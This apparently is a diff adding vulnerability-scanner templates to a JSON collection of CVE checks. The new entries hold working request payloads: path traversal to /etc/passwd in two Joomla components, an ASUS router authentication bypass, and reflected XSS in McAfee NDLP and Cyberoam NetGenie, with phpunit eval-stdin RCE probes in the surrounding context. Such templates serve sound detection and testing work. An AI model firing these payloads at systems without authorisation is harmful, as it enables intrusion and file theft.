@@ -830,6 +830,74 @@
       ]
     },
     {
+      "id": "CVE-2010-1722",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Online Market (com_market) component 2.x for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impact via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component Online Market 2.x - Local File Inclusion",
+        "reference": "- https://www.exploit-db.com/exploits/12177\n- https://www.cvedetails.com/cve/CVE-2010-1722\n",
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_market&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-1953",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the iNetLanka Multiple Map (com_multimap) component 1.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component iNetLanka Multiple Map 1.0 - Local File Inclusion",
+        "reference": "- https://www.exploit-db.com/exploits/12288\n- https://www.cvedetails.com/cve/CVE-2010-1953\n",
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_multimap&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1955",
       "info": {
         "author": "daffainfo",
@@ -7149,6 +7217,49 @@
             "GET /laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36\nConnection: close\nContent-Length: 17\nAccept: */*\nAccept-Language: en\nContent-Type: text/html\nAccept-Encoding: gzip, deflate\n\n<?php echo md5(phpunit_rce);?>\n",
             "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36\nConnection: close\nContent-Length: 17\nAccept: */*\nAccept-Language: en\nContent-Type: text/html\nAccept-Encoding: gzip, deflate\n\n<?php echo md5(phpunit_rce);?>\n",
             "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36\nConnection: close\nContent-Length: 17\nAccept: */*\nAccept-Language: en\nContent-Type: text/html\nAccept-Encoding: gzip, deflate\n\n<?php echo md5(phpunit_rce);?>\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2017–4011",
+      "info": {
+        "author": "geeknik",
+        "description": "McAfee Network Data Loss Prevention (NDLP) 9.3.x allows remote attackers to get session/cookie information via modification of the HTTP request.",
+        "name": "McAfee NDLP User-Agent XSS",
+        "reference": [
+          "https://medium.com/@david.valles/cve-2017-4011-reflected-xss-found-in-mcafee-network-data-loss-prevention-ndlp-9-3-x-cf20451870ab",
+          "https://kc.mcafee.com/corporate/index?page=content&id=SB10198",
+          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-4011"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2017,mcafee,xss"
+      },
+      "requests": [
+        {
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1';alert(/XSS/);//"
+          },
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "var ua='Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1';alert(/XSS/);//"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}"
           ]
         }
       ]
@@ -22593,6 +22704,49 @@
       ]
     },
     {
+      "id": "CVE-2021-32030",
+      "info": {
+        "author": "gy741",
+        "description": "The administrator application on ASUS GT-AC2900 devices before 3.0.0.4.386.42643 allows authentication bypass when processing remote input from an unauthenticated user, leading to unauthorized access to the administrator interface. This relates to handle_request in router/httpd/httpd.c and auth_check in web_hook.o. An attacker-supplied value of '\\0' matches the device's default value of '\\0' in some situations.",
+        "name": "ASUS GT-AC2900 - Authentication Bypass",
+        "reference": "https://www.atredis.com/blog/2021/4/30/asus-authentication-bypass",
+        "severity": "high",
+        "tags": "cve,cve2021,asus,auth-bypass,router"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "application/json"
+              ]
+            },
+            {
+              "condition": "and",
+              "type": "word",
+              "words": [
+                "get_cfg_clientlist",
+                "alias",
+                "model_name"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: asusrouter--\nConnection: close\nReferer: {{BaseURL}}\nCookie: asus_token=\\0Invalid; clickedItem_tab=0\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-3223",
       "info": {
         "author": "gy741,pikpikcu",
@@ -23403,6 +23557,47 @@
           "path": [
             "{{BaseURL}}/vendor/phpfastcache/phpfastcache/docs/examples/phpinfo.php",
             "{{BaseURL}}/vendor/phpfastcache/phpfastcache/examples/phpinfo.php"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-38702",
+      "info": {
+        "author": "geeknik",
+        "description": "Cyberoam NetGenie C0101B1-20141120-NG11VO devices through 2021-08-14 allow for reflected Cross Site Scripting via the 'u' parameter of ft.php.",
+        "name": "Cyberoam NetGenie XSS",
+        "reference": "https://seclists.org/fulldisclosure/2021/Aug/20",
+        "severity": "medium",
+        "tags": "cve,cve2021,cyberoam,netgenie,xss,router"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/tweb/ft.php?u=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
